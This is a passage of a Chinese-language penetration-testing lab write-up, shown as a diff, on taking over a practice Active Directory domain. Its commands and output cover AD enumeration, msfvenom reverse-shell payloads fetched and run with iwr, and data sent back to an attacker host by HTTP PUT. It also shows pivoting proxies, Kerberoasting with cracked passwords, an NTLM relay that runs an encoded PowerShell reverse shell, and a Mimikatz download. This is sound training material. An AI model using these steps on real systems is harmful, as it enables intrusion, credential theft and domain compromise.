@@ -1336,3 +1336,766 @@ Ethernet adapter Ethernet0:
    Default Gateway . . . . . . . . . : 172.16.73.254
 PS C:\Windows\System32\WindowsPowerShell\v1.0> 
 ```
+
+## Enumerating the Internal Network
+- 蒐集內部網路的資訊
+- 枚舉 AD 環境，尋找用戶、電腦、網域管理員等資訊
+### Situational Awareness
+前已經成功取得 CLIENTWK1 的反向 Shell
+#### 1. 取得 CLIENTWK1 的基本資訊
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cp /home/chw/winPEASx64.exe .
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 -m http.server 8000
+```
+```
+PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/winPEASx64.exe -Outfile winPEAS.exe                 
+iwr -uri http://192.168.45.214:8000/winPEASx64.exe -Outfile winPEAS.exe
+PS C:\Users\marcus>.\winPEAS.exe
+...
+����������͹ Basic System Information
+� Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
+    Hostname: CLIENTWK1
+    Domain Name: beyond.com
+    ProductName: Windows 10 Pro
+    EditionID: Professional
+...
+AV Information:
+No AV was detected!!
+...
+����������͹ Network Ifaces and known hosts
+� The masks are only for the IPv4 addresses 
+    Ethernet0[00:50:56:AB:26:41]: 172.16.73.243 / 255.255.255.0
+        Gateways: 172.16.73.254
+        DNSs: 172.16.73.240
+        Known hosts:
+          172.16.73.240         00-50-56-AB-13-3B     Dynamic
+          172.16.73.254         00-50-56-AB-A8-17     Dynamic
+          172.16.73.255         FF-FF-FF-FF-FF-FF     Static
+
+...
+
+����������͹ DNS cached --limit 70--
+    Entry                                 Name                                  Data
+    mailsrv1.beyond.com                   mailsrv1.beyond.com                   172.16.73.254
+                  
+PS C:\Users\marcus> systeminfo
+Host Name:                 CLIENTWK1
+OS Name:                   Microsoft Windows 11 Pro
+OS Version:                10.0.22000 N/A Build 22000
+...
+```
+> 1. CLIENTWK1 屬於 beyond.com 網域，並運行 Windows 10 Pro (實際上是 Windows 11)
+> 2. 沒有偵測到防毒軟體，表示可以任意執行惡意工具
+> 3. `172.16.73.240` : 可能是 DC (DCSRV1)
+> 4. `172.16.73.254 `: `MAILSRV1` 內部 IP (之前從外部連線時是 192.168.117.242，表示雙網卡設備)
+
+紀錄這些資訊
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat computer.txt             
+172.16.73.240 - DCSRV1.BEYOND.COM  # 可能是網域控制器
+172.16.73.254 - MAILSRV1.BEYOND.COM  # 內部郵件伺服器，雙網卡設備
+172.16.73.243 - CLIENTWK1.BEYOND.COM  # 目前我們入侵的電腦
+```
+#### 2. Active Directory 枚舉
+使用 BloodHound 掃描 網域內的用戶、電腦和管理員。
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
+```
+```
+PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+iwr -uri http://192.168.45.214:8000/SharpHound.ps1 -Outfile SharpHound.ps1
+PS C:\Users\marcus> powershell -ep bypass
+powershell -ep bypass
+PS C:\Users\marcus> . .\SharpHound.ps1
+. .\SharpHound.ps1
+PS C:\Users\marcus> . .\SharpHound.ps1
+. .\SharpHound.ps1
+PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
+Invoke-BloodHound -CollectionMethod All
+2025-03-18T08:57:54.4374618-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
+2025-03-18T08:57:54.5468360-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2025-03-18T08:57:54.5468360-07:00|INFORMATION|Initializing SharpHound at 8:57 AM on 3/18/2025
+2025-03-18T08:57:54.6093337-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for beyond.com : DCSRV1.beyond.com
+2025-03-18T08:57:54.7812108-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2025-03-18T08:57:54.8749602-07:00|INFORMATION|Beginning LDAP search for beyond.com
+2025-03-18T08:57:54.8905900-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2025-03-18T08:57:54.8905900-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2025-03-18T08:58:25.8281459-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 99 MB RAM
+2025-03-18T08:58:37.5781689-07:00|INFORMATION|Consumers finished, closing output channel
+Closing writers
+2025-03-18T08:58:37.5937523-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2025-03-18T08:58:37.6718771-07:00|INFORMATION|Status: 97 objects finished (+97 2.309524)/s -- Using 105 MB RAM
+2025-03-18T08:58:37.6718771-07:00|INFORMATION|Enumeration finished in 00:00:42.8001829
+2025-03-18T08:58:37.7187518-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.
+ 57 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2025-03-18T08:58:37.7187518-07:00|INFORMATION|SharpHound Enumeration Completed at 8:58 AM on 3/18/2025! Happy Graphing!
+```
+> 成功執行後，會生成 BloodHound.zip，再將其傳送回 Kali 分析
+
+#### 3. 使用 BloodHound 分析 AD 結構
+>[!Caution]
+>直接使用 `scp -v 20250318085837_BloodHound.zip chw@192.168.45.214:/home/chw/beyond/`\
+>會倒置 Error: `debug1: read_passphrase: can't open /dev/tty: No such file or directory`:\
+> SCP 無法在 Windows PowerShell 中提示輸入密碼，因為 OpenSSH for Windows 預設會嘗試從 /dev/tty 讀取密碼，而 Windows 沒有 /dev/tty 這個裝置
+
+Kali 寫一個 upload.py，接收檔案 (python http.server 不接收 `PUT`)
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat upload.py                   
+#!/usr/bin/env python3
+from http.server import SimpleHTTPRequestHandler, HTTPServer
+
+class HTTPRequestHandler(SimpleHTTPRequestHandler):
+    def do_PUT(self):
+        file_path = self.translate_path(self.path)
+        length = int(self.headers['Content-Length'])
+        with open(file_path, 'wb') as f:
+            f.write(self.rfile.read(length))
+        self.send_response(201, "Created")
+        self.end_headers()
+
+server_address = ('0.0.0.0', 8000)  # 監聽所有 IP，使用 8000 端口
+httpd = HTTPServer(server_address, HTTPRequestHandler)
+print("Serving HTTP on port 8000 (Upload Enabled)...")
+httpd.serve_forever()
+
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 upload.py     
+
+Serving HTTP on port 8000 (Upload Enabled)...
+192.168.117.242 - - [18/Mar/2025 13:12:47] "PUT /20250318085837_BloodHound.zip HTTP/1.1" 201 -
+
+```
+Window: marcus 上傳
+```
+PS C:\Users\marcus> Invoke-WebRequest -Uri "http://192.168.45.214:8000/20250318085837_BloodHound.zip" -Method Put -InFile "20250318085837_BloodHound.zip"
+Invoke-WebRequest -Uri "http://192.168.45.214:8000/20250318085837_BloodHound.zip" -Method Put -InFile "20250318085837_BloodHound.zip"
+
+
+StatusCode        : 201
+StatusDescription : Created
+Content           : {}
+RawContent        : HTTP/1.0 201 Created
+                    Date: Tue, 18 Mar 2025 17:12:47 GMT
+                    Server: SimpleHTTP/0.6 Python/3.11.9
+                    
+                    
+Headers           : {[Date, Tue, 18 Mar 2025 17:12:47 GMT], [Server, SimpleHTTP/0.6 Python/3.11.9]}
+RawContentLength  : 0
+
+```
+Kali 啟動 neo4j 和 BloodHound:
+使用 Cypher Query Language 搜尋
+#### 3.1 搜尋所有電腦
+```
+MATCH (m:Computer) RETURN m
+```
+![image](https://hackmd.io/_uploads/BySlhQwnkl.png)
+> 我們擁有 interactive shell 的 `CLIENTWK1` 之外，BloodHound 還識別了已知的DC `DCSRV1` 和主郵件伺服器 MAILSRV1。此外，它還發現了另一台名為 `INTERNALSRV1` 的機器。
+> >`DCSRV1.BEYOND.COM` - Windows Server 2022 Standard\
+`INTERNALSRV1.BEYOND.COM` - Windows Server 2022 Standard\
+`MAILSRV1.BEYOND.COM` - Windows Server 2022 Standard\
+`CLIENTWK1.BEYOND.COM` - Windows 11 Pro
+
+
+nslookup 查詢 `INTERNALSRV1`
+```
+PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
+nslookup INTERNALSRV1.BEYOND.COM
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  172.16.73.240
+
+Name:    INTERNALSRV1.BEYOND.COM
+Address:  172.16.73.241
+
+```
+
+更新 Kali 的 computer.txt:
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat computer.txt
+172.16.73.240 - DCSRV1.BEYOND.COM  # 可能是網域控制器
+172.16.73.241 - INTERNALSRV1.BEYOND.COM  # 內部伺服器
+172.16.73.254 - MAILSRV1.BEYOND.COM  # 內部郵件伺服器，雙網卡設備
+172.16.73.244 - CLIENTWK1.BEYOND.COM  # 目前我們入侵的電腦
+
+```
+#### 3.1 搜尋所有使用者
+```
+MATCH (u:User) RETURN u
+```
+![image](https://hackmd.io/_uploads/BJ3Xpmwh1g.png)
+> 除了 AD 預設 user:
+> BECCY\
+JOHN\
+DANIELA\
+MARCUS
+>> 發現新的 domain account `BECCY`，並確認 `DANIELA` 也是 domain user
+
+將 marcus（CLIENTWK1 上的互動式 shell）和 john（有效憑證）標記為 `Owned`\
+並更新 Kali 的 usernames.txt:
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat usernames.txt 
+marcus
+john
+daniela
+beccy
+```
+#### 3.3 查詢網域管理員
+選擇 Find All Domain Admins\
+![image](https://hackmd.io/_uploads/ryZcC7v3kg.png)
+> Domain Admins:\
+> - BECCY
+> - Administrator
+> > 目標：拿下 `BECCY`
+
+- Find Workstations where Domain Users can RDP
+- Find Servers where Domain Users can RDP
+- Find Computers where Domain Users are Local Admin
+- Shortest Path to Domain Admins from Owned Principals
+
+Analysis 的以上條件都不符合\
+另外，也沒有 Domain User 是任何本機的 Local Admin。因此，我們沒有以 john 或 marcus 身分存取任何網域電腦的特權
+
+### Services and Sessions
+
+>[!Note]
+>進一步分析內網環境，找出更多潛在的攻擊向量。
+> - 查詢目前活躍的使用者登入會話 (Sessions)
+> - 尋找可以進行 Kerberoasting 攻擊的帳號
+> - 透過 SOCKS5 Proxy 進行內部網路掃描
+> - 存取 INTERNALSRV1 上的 WordPress 站點
+
+#### 1. 確認目前登入的使用者 (Active Sessions)
+Cypher 查詢列出所有登入的使用者
+```
+MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
+```
+![image](https://hackmd.io/_uploads/By_jgNPnkx.png)
+> 1. CLIENTWK1 → marcus (已知)
+>2. MAILSRV1 → beccy (域管理員):若拿到機器的特權訪問，就可以提取該用戶的 NTLM hash
+>3. INTERNALSRV1 → Administrator (本機管理員): RID 500
+
+#### 2. 確認可以進行 Kerberoasting 的帳號
+識別網域中所有 kerberoastable 使用者\
+Analysis 選擇 List All Kerberoastable Accounts\
+![image](https://hackmd.io/_uploads/Bk7eMEDhJx.png)
+> daniela 也是可攻擊目標
+
+daniela > Node Info > Service Principal Names\
+SPN: `http/internalsrv1.beyond.com`
+
+>[!Note]
+>假設 `INTERNALSRV1` 上執行一個 Web 伺服器。一旦我們執行了 Kerberoasting 可能獲得 daniela 的明文密碼，就可以使用它來存取 `INTERNALSRV1`。\
+>使用 Kerberoasting 攻擊來取得 Hash
+
+#### 3. 透過 SOCKS5 Proxy 進行內網掃描
+需要對內網進行 `Nmap` 和 `CrackMapExec` 掃描
+#### 3.1 使用 msfvenom 產生 Meterpreter Reverse Shell
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: met.exe
+
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+啟用 msfconsole  監聽
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ sudo msfconsole -q
+[sudo] password for chw: 
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.45.214
+LHOST => 192.168.45.214
+msf6 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+[*] Started reverse TCP handler on 192.168.45.214:443 
+
+```
+> `set ExitOnSession false`: 設定為 false，multi/handler 會一直保持運行，即使已有 session 連線，也會繼續等待新的連線\
+> `run -j`: background job 讓 handler 在背景執行，不會影響 Metasploit console
+#### 3.2 在 CLIENTWK1 下載並執行
+```
+PS C:\Users\marcus> iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
+iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
+PS C:\Users\marcus> .\met.exe
+.\met.exe
+```
+msfconsole 收到 reverse shell
+```
+msf6 exploit(multi/handler) > 
+[*] Started reverse TCP handler on 192.168.45.214:443 
+[*] Sending stage (201798 bytes) to 192.168.117.242
+[*] Meterpreter session 1 opened (192.168.45.214:443 -> 192.168.117.242:62790) at 2025-03-18 14:02:09 -0400
+```
+#### 3.3  在 Metasploit 建立 SOCKS5 Proxy
+1. 自動設定內部路由 (autoroute)
+```
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+session => 1
+msf6 post(multi/manage/autoroute) > run
+
+[*] Running module against CLIENTWK1
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.73.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+```
+> autoroute modulw 會自動分析 `CLIENTWK1` 連接的內部網段\
+發現 CLIENTWK1 連接到 172.16.73.0/24，並自動建立路由\
+現在 Kali 可以透過 CLIENTWK1 存取 172.16.73.0/24 內網
+
+2. 建立 SOCKS5 Proxy
+```
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set VERSION 5
+VERSION => 5
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 1.
+msf6 auxiliary(server/socks_proxy) > 
+[*] Starting the SOCKS proxy server
+
+```
+> 啟動 SOCKS5 代理伺服器，讓 Kali 透過 CLIENTWK1 來存取 172.16.73.0/24\
+`SRVHOST 127.0.0.1`: 只允許本機 (Kali) 使用 proxy\
+因此可以使用 proxychains 透過 CLIENTWK1 掃描和存取內部網路
+
+檢查先前章節的設定還在
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cat /etc/proxychains4.conf
+...
+socks5  127.0.0.1 1080
+```
+
+#### 3.4 透過 CrackMapExec 掃描 SMB share
+使用 proxychains 枚舉內部 SMB
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ proxychains -q crackmapexec smb 172.16.73.240-241 172.16.73.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares --no-bruteforce
+SMB         172.16.73.240    445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
+SMB         172.16.73.241    445    INTERNALSRV1     [*] Windows 10.0 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         172.16.73.254    445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         172.16.73.240    445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.73.241    445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.73.240    445    DCSRV1           [+] Enumerated shares
+SMB         172.16.73.240    445    DCSRV1           Share           Permissions     Remark
+SMB         172.16.73.240    445    DCSRV1           -----           -----------     ------
+SMB         172.16.73.240    445    DCSRV1           ADMIN$                          Remote Admin
+SMB         172.16.73.240    445    DCSRV1           C$                              Default share
+SMB         172.16.73.240    445    DCSRV1           IPC$            READ            Remote IPC
+SMB         172.16.73.240    445    DCSRV1           NETLOGON        READ            Logon server share 
+SMB         172.16.73.240    445    DCSRV1           SYSVOL          READ            Logon server share 
+SMB         172.16.73.241    445    INTERNALSRV1     [+] Enumerated shares
+SMB         172.16.73.241    445    INTERNALSRV1     Share           Permissions     Remark
+SMB         172.16.73.241    445    INTERNALSRV1     -----           -----------     ------
+SMB         172.16.73.241    445    INTERNALSRV1     ADMIN$                          Remote Admin
+SMB         172.16.73.241    445    INTERNALSRV1     C$                              Default share
+SMB         172.16.73.241    445    INTERNALSRV1     IPC$            READ            Remote IPC
+SMB         172.16.73.254    445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.73.254    445    MAILSRV1         [+] Enumerated shares
+SMB         172.16.73.254    445    MAILSRV1         Share           Permissions     Remark
+SMB         172.16.73.254    445    MAILSRV1         -----           -----------     ------
+SMB         172.16.73.254    445    MAILSRV1         ADMIN$                          Remote Admin
+SMB         172.16.73.254    445    MAILSRV1         C$                              Default share
+SMB         172.16.73.254    445    MAILSRV1         IPC$            READ            Remote IPC
+```
+> 172.16.73.240 (DCSRV1)  - 可讀取 `NETLOGON` 和 `SYSVOL`\
+172.16.73.241 (INTERNALSRV1) - 只有預設共享 (無權限)\
+172.16.73.254 (MAILSRV1) - 只有預設共享 (無權限)
+
+#### 3.5 透過 Nmap 掃描內部 Web 服務
+```
+──(chw㉿CHW)-[~/beyond]
+└─$ sudo proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.73.240 172.16.73.241 172.16.73.254
+[sudo] password for chw: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 14:31 EDT
+RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
+Nmap scan report for 172.16.73.240
+Host is up (2.6s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  closed http
+443/tcp closed https
+
+Nmap scan report for 172.16.73.241
+Host is up (5.3s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp open   https
+
+Nmap scan report for 172.16.73.254
+Host is up (2.6s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp closed https
+
+Nmap done: 3 IP addresses (3 hosts up) scanned in 42.35 seconds
+```
+> DCSRV1 (172.16.73.240): 無 Web 服務\
+INTERNALSRV1 (172.16.73.241): HTTP (80) 和 HTTPS (443) 開啟\
+MAILSRV1 (172.16.73.254): HTTP (80) 開啟
+>> 可確認 INTERNALSRV1 與 MAILSRV1 有 Web 服務
+
+#### 3.6 透過 Chisel 瀏覽 INTERNALSRV1 Web 服務
+1. 在 Kali 啟動 Chisel Server
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cp /usr/bin/chisel .                                           
+┌──(chw㉿CHW)-[~/beyond]
+└─$ chmod a+x chisel
+    
+┌──(chw㉿CHW)-[~/beyond]
+└─$ ./chisel server -p 8080 --reverse
+2025/03/18 14:36:09 server: Reverse tunnelling enabled
+2025/03/18 14:36:09 server: Fingerprint VbGEO884eECfHw8SWkKLxuZkJEG0FURB/tJ8RauoI/o=
+2025/03/18 14:36:09 server: Listening on http://0.0.0.0:8080
+
+```
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ cp /home/chw/Chisel_x64/chisel ./chisel_x64
+
+┌──(chw㉿CHW)-[~/beyond]
+└─$ python3 -m http.server 8888
+Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+```
+在 CLIENTWK1 執行 Chisel 並進行反向連線
+```
+PS C:\Users\marcus> iwr -uri http://192.168.45.214:8888/chisel_x64 -Outfile chisel.exe 
+iwr -uri http://192.168.45.214:8888/chisel_x64 -Outfile chisel.exe
+2025/03/11 15:01:46 client: Connecting to ws://192.168.119.5:8080
+2025/03/11 15:01:46 client: Connected (Latency 11.0449ms)
+```
+
+2. 嘗試登入 WordPress
+前往管理頁面 http://127.0.0.1/wordpress/wp-admin 會跳轉至 `internalsrv1.beyond.com`\
+手動加入 `/etc/hosts`
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ vi /etc/hosts  
+...
+127.0.0.1    internalsrv1.beyond.com
+```
+打開 /wp-admin\
+![image](https://hackmd.io/_uploads/BkEQ7rDn1l.png)
+
+## Attacking an Internal Web Application
+目標：
+- 對 daniela 進行 Kerberoasting，取得 WordPress 登入密碼
+- 濫用 WordPress Plugin，發動 NTLM Relay 攻擊，取得 MAILSRV1 的 SYSTEM 權限
+
+### Speak Kerberoast and Enter
+INTERNALSRV1 上的 Web Application 是目前最有希望的目標。因為是一個 WordPress 網站
+#### Kerberoasting 取得 daniela 的密碼
+- daniela 是 Kerberoastable
+- SPN 是 `http/internalsrv1.beyond.com `，表示可能有 WordPress 管理權限
+#### 1. 利用 impacket-GetUserSPNs 取得 TGS-REP Hash
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.73.240 beyond.com/john
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName      Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------  -------  --------  --------------------------  --------------------------  ----------
+http/internalsrv1.beyond.com  daniela            2025-03-11 16:17:20.062328  2025-03-11 16:59:48.376728             
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$4c6c4600baa0ef09e40fde6130e3d770$49023c03dcf9a21ea5b943e179f843c575d8f54b1cd85ab12658364c23a46fa53b3db5f924a66b1b28143f6a357abea0cf89af42e08fc38d23b205a3e1b46aed9e181446fa7002def837df76ca5345e3277abaa86...
+2e430c5a8f0235b45b66c5fe0c8b4ba16efc91586fc22c2c9c1d8d0434d4901d32665cceac1ab0cdcb89ae2c2d688307b9c5d361beba29b75827b058de5a5bba8e60af3562f935bd34feebad8e94d44c0aebc032a3661001541b4e30a20d380cac5047d2dafeb70e1ca3f9e507eb72a4c7
+```
+> 成功取得 daniela 的 `TGS-REP Hash`
+
+#### 2. 使用 Hashcat 破解密碼
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
+...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$b0750f4754ff26fe77d2288ae3cca539$0922083b88587a2e765298cc7d499b368f7c39c7f6941a4b419d8bb1405e7097891c1af0a885ee76ccd1f32e988d6c4653e5cf4ab9602004d84a6e1702d2fbd5a3379bd376de696b0e8993aeef5b1e78fb24f5d3c
+...
+3d3e9d5c0770cc6754c338887f11b5a85563de36196b00d5cddecf494cfc43fcbef3b73ade4c9b09c8ef405b801d205bf0b21a3bca7ad3f59b0ac7f6184ecc1d6f066016bb37552ff6dd098f934b2405b99501f2287128bff4071409cec4e9545d9fad76e6b18900b308eaac8b575f60bb:DANIelaRO123
+...
+```
+> `daniela`:`DANIelaRO123`
+
+#### 3. 登入 INTERNALSRV1 的 WordPress
+登入 http://127.0.0.1/wordpress/wp-admin\
+![image](https://hackmd.io/_uploads/ByM26jw2ye.png)
+
+### Abuse a WordPress Plugin for a Relay Attack
+
+#### 1. 瀏覽 WordPress 設定
+- daniela 是唯一的 WordPress 使用者
+![image](https://hackmd.io/_uploads/rkqmAoD2yl.png)
+- 唯一啟用的 Plugin 是 `Backup Migration`
+![image](https://hackmd.io/_uploads/Bku40svnyl.png)
+- 外掛允許自定義「備份目標目錄」
+![image](https://hackmd.io/_uploads/rk6cRiD3kg.png)
+> 可以當作目標設為攻擊機器來誘導目標伺服器進行身份驗證
+#### 2. NTLM Relay 攻擊計畫
+- `INTERNALSRV1` 的本機管理員 (Administrator) 可能與 `MAILSRV1` 的管理員使用相同密碼
+- MAILSRV1 禁用 SMB signing，可進行 NTLM Relay 攻擊
+- 利用 WordPress  Plugin 設定備份目標為我們的 Kali 機器 (//192.168.45.214/test)
+    - 這將導致 `INTERNALSRV1` 嘗試對 Kali 進行身份驗證
+    - 可以攔截 NTLM 驗證，並將其轉發到 `MAILSRV1` 以獲得 SYSTEM 權限
+
+#### 3. 設置 NTLM Relay 攻擊
+##### 3.1 啟動 impacket-ntlmrelayx
+啟動 impacket-ntlmrelayx
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.45.214 -c "powershell -enc JABjAGwAaQ..."
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+```
+> `impacket-ntlmrelayx`：使用 Impacket 工具套件來執行 NTLM Relay 攻擊\
+> `--no-http-server`: 關閉 HTTP 伺服器\
+> `-smb2support`: 啟用對 SMBv2 的支援\
+> `-t 192.168.45.214`: 指定攻擊目標（將 NTLM 驗證請求轉發到的機器）\
+> Revers shell : [powershell_reverse_shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
+
+kali 開啟 nc 監聽：
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ nc -nvlp 9999
+listening on [any] 9999 ...
+```
+##### 3.2 設置 WordPress Backup Migration Plugin
+將備份目錄設定為 Kali SMB 伺服器 (192.168.45.214)
+```
+//192.168.45.214/test
+```
+> 強制 INTERNALSRV1 向 Kali 伺服器進行 NTLM 身份驗證\
+> "SAVE"
+
+(impacket-ntlmrelayx)
+```
+└─$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.45.214 -c "powershell -enc JABjAGwAaQ..."
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+...
+[*] Servers started, waiting for connections
+...
+[*] Authenticating against smb://192.168.117.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
+...
+[*] Service RemoteRegistry is in stopped state
+...
+[*] Starting service RemoteRegistry
+...
+[*] Executed specified command on host: 192.168.117.242
+...
+[*] Stopping service RemoteRegistry
+```
+(Kali listenning Port)
+```
+┌──(chw㉿CHW)-[~/beyond]
+└─$ nc -nvlp 9999
+listening on [any] 9999 ...
+connect to [192.168.45.214] from (UNKNOWN) [192.168.117.242] 50063
+whoami
+nt authority\system
+
+PS C:\Windows\system32> hostname
+MAILSRV1
+
+PS C:\Windows\system32> 
+```
+
+`MAILSRV1` 上的 NT AUTHORITY\SYSTEM 可以存取 MAILSRV1 上 beccy 的 NTLM hash\
+🎯 進一步取得 Domain Controller (`DCSRV1`) 的控制權
+
+## Gaining Access to the Domain Controller
+### Cached Credentials
+>[!Tip]
+>Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for beccy.
+
+#### 1. 下載並執行 Meterpreter 取得更強大的 shell
+```
+PS C:\Windows\system32> cd C:\Users\Administrator
+
+PS C:\Users\Administrator> iwr -uri http://192.168.45.214:8000/met.exe -Outfile met.exe
+
+PS C:\Users\Administrator> .\met.exe
+```
+( 在 Kali 上接收 `MAILSRV1` 的 Meterpreter)
+```
+[*] Sending stage (200774 bytes) to 192.168.117.242
+[*] Meterpreter session 2 opened (192.168.45.214:443 -> 192.168.117.242:50814)
+
+msf6 post(multi/manage/autoroute) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > shell
+Process 416 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.20348.1006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator> powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\Administrator> 
+```
+#### 2. 下載並執行 Mimikatz 取得 beccy 的憑證
+```
+PS C:\Users\Administrator> iwr -uri http://192.168.45.214:8000/mimikatz.exe -Outfile mimikatz.exe
+
+PS C:\Users\Administrator> .\mimikatz.exe
+.\mimi.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Mar 19 2025 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
